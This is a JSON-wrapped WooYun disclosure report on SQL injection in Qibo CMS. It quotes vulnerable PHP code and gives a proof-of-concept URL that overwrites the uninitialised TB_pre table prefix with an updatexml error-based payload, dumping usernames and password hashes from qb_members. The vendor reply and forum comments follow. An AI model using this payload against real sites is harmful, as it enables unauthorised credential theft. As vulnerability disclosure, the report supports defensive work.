{"id": 9279, "wybug_id": "wooyun-2015-0111673", "wybug_title": "齐博多个系统SQL注入", "wybug_corp": "齐博CMS", "wybug_author": "牛肉包子", "wybug_date": "2015-05-07 10:54", "wybug_open_date": "2015-08-06 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向公众公开  简要描述： rt 详细说明：  我们以视频系统为例看到video/member/special.php\nelseif($job==\"show_BBSiframe\"){\t$rsdb=$db->get_one(\"SELECT * FROM {$_pre}special WHERE uid='$lfjuid' AND id='$id'\");\tif(!$rsdb){\t\tshowerr(\"资料不存在\",1);\t}\t//专题内的贴子排序\tif($act==\"order\")\t{\t\tunset($array);\t\tforeach( $listdb AS $aid=>$list){\t\t\t$list=$list*1000000+$aid;\t\t\t$array[$list]=$aid;\t\t}\t\tksort($array);\t\t$rsdb[tids]=implode(\",\",$array);\t\t$db->query(\"UPDATE {$_pre}special SET tids='$rsdb[tids]' WHERE uid='$lfjuid' AND id='$id'\");\t}\t\t//添加贴子到专题\tif($act==\"add\"&&$aid)\t{\t\tunset($_detail);\t\t$detail=explode(\",\",$rsdb[tids]);\t\tif(count($detail)>100){\t\t\tshowerr(\"记录已到上限!\",1);\t\t}\t\tif(!in_array($aid,$detail)){\t\t\tif($detail[0]==''){unset($detail[0]);}\t\t\t$_detail[a]=$aid;\t\t\t$rsdb[tids]=$string=implode(\",\",array_merge($_detail,$detail));\t\t\t$db->query(\"UPDATE {$_pre}special SET tids='$string' WHERE uid='$lfjuid' AND id='$id'\");\t\t}\t}\t//移除专题里的贴子\tif($act==\"del\"&&$aid)\t{\t\t$detail=explode(\",\",$rsdb[tids]);\t\tforeach( $detail AS $key=>$value){\t\t\tif($value==$aid){\t\t\t\tunset($detail[$key]);\t\t\t}\t\t}\t\t$rsdb[tids]=$string=implode(\",\",$detail);\t\t$db->query(\"UPDATE {$_pre}special SET tids='$string' WHERE uid='$lfjuid' AND id='$id'\");\t}\t\t//$type=='all'初始化列出专题里的贴子,$type==\"list_atc\"删除与添加时列出专题里的贴子\tif($type==\"list_atc\"||$type=='all')\t{\t\tunset($_listdb,$show);\t\t$detail=explode(\",\",$rsdb[tids]);\t\t$string=0;\t\tforeach( $detail AS $key=>$value){\t\t\tif($value>0){\t\t\t\t$string.=\",$value\";\t\t\t}\t\t}\t\tif(ereg(\"^pwbbs\",$webdb[passport_type])){\t\t\t$query = $db->query(\"SELECT * FROM {$TB_pre}threads WHERE tid IN ($string)\");\t\t\twhile($rs = $db->fetch_array($query)){\t\t\t\t$rs[subject]=\"<a href='$webdb[passport_url]/read.php?tid=$rs[tid]' target=_blank>$rs[subject]</a>\";\t\t\t\t$_listdb[$rs[tid]]=$rs;\t\t\t}\t\t}\t\t$aidsdb=explode(\",\",$rsdb[tids]);\t\t$NUM=0;\t\tforeach($aidsdb AS $key=>$value){\t\t\t$NUM++;\t\t\tif($_listdb[$value]){\t\t\t\t$show.=\"<tr align='center' class='trA' onmouseover=\\\"this.className='trB'\\\" onmouseout=\\\"this.className='trA'\\\">                 <td width='5%'>{$_listdb[$value][tid]}</td>                <td width='74%' align='left'>{$_listdb[$value][subject]}</td>\t\t\t\t\t<td width='10%'><input type='text' name='listdb[{$value}]' size='5' value='{$NUM}0'></td>                <td width='11%'><A HREF='special.php?job=show_BBSiframe&id=$id&type=list_atc&act=del&aid={$_listdb[$value][tid]}' target='spiframe'>移除</A></td>              </tr>\";\t\t\t}\t\t}\t\t$show=\"<table width='100%' border='0' cellspacing='1' cellpadding='3'>              <tr align='center' bgcolor='#eeeeee'>                 <td width='5%'>ID</td>                <td width='74%'>标 题</td>\t\t\t\t  <td width='10%'>排序值</td>                <td width='11%'>移除 </td>\t\t\t\t  $show              </tr>\t\t\t              </table>\";\t\t$show=str_replace(\"\\r\",\"\",$show);\t\t$show=str_replace(\"\\n\",\"\",$show);\t\t$show=str_replace('\"','\\\"',$show);\t\techo \"<SCRIPT LANGUAGE='JavaScript'>\t\t<!--\t\tparent.document.getElementById('sp_atclist').innerHTML=\\\"$show\\\";\t\t//-->\t\t</SCRIPT>\";\t}\t//\tif($type=='myatc'||$type=='all')\t{\t\t$detail=explode(\",\",$rsdb[tids]);\t\t$show='';\t\tif($page<1){\t\t\t$page=1;\t\t}\t\t$rows=15;\t\t$min=($page-1)*$rows;\t\tif($keywords){//搜索时\t\t\t$SQL=\" BINARY subject LIKE '%$keywords%' \";\t\t}elseif($ismy){\t\t\t$SQL=\" authorid='$lfjuid' \";\t\t}else{\t\t\t$SQL=' 1 ';\t\t}\t\t\t\tif($fid>0){\t\t\t$SQL.=\" AND fid='$fid' \";\t\t}\t\t$showpage=getpage(\"{$TB_pre}threads\",\"WHERE $SQL\",\"\",$rows);\t\t$query = $db->query(\"SELECT * FROM {$TB_pre}threads WHERE $SQL ORDER BY tid DESC LIMIT $min,$rows\");\n其中{$TB_pre}未初始化，由于qibo存在伪全局变量注册，所以造成了sql注入。首先我们注册一个用户，然后发布专题。\n\n然后记录专题id。\nhttp://127.0.0.1/qibo_video1.0/video/showsp.php?fid=1&id=12\n然后构造\nhttp://127.0.0.1/qibo_video1.0/member/special.php?job=show_BBSiframe&type=myatc&id=12&TB_pre=qb_module where 1=1 or 1=updatexml(2,concat(0x7e,((select concat(username,0x5c,password) from qb_members limit 0,1))),0) %23\n\n\n直接出数据下载系统\n\n新闻系统\n\n就不一一演示了。   漏洞证明：  \n\n   修复方案：  初始化   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-05-08 11:38 厂商回复： 这个问题已经有人提出过了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-07 11:08 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  番茄湿父开始逮着齐博薅羊毛了吗    \n     2015-05-07 11:22 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @sco4x0 一周之前的咯。    \n     2015-05-07 12:15 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  为什么又没有钱？    \n     2015-05-07 12:22 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @孤独行者 因为长得太丑    \n     2015-05-07 12:28 |    \t\t孤独行者 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:44        | 时光如水，总是无言。你若安好，便是晴天)\t\t \n  @牛肉包子 牛肉包子应该很好吃啊。。很漂亮啊。。怎么能丑呢    \n     2015-05-08 03:37 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  师父，我看不了  啊 分享给我啊    \n     2015-08-06 12:45 |    \t\tbobbi \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 人生真是寂寞如雪)\t\t \n  又来个重复    \n     2015-09-20 11:45 |    \t\tSun° \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 学习学习)\t\t \n  为啥爆出来的md5都不完整啊？求解    \n     2015-09-20 11:46 |    \t\tSun° \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 学习学习)\t\t \n  @牛肉包子    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}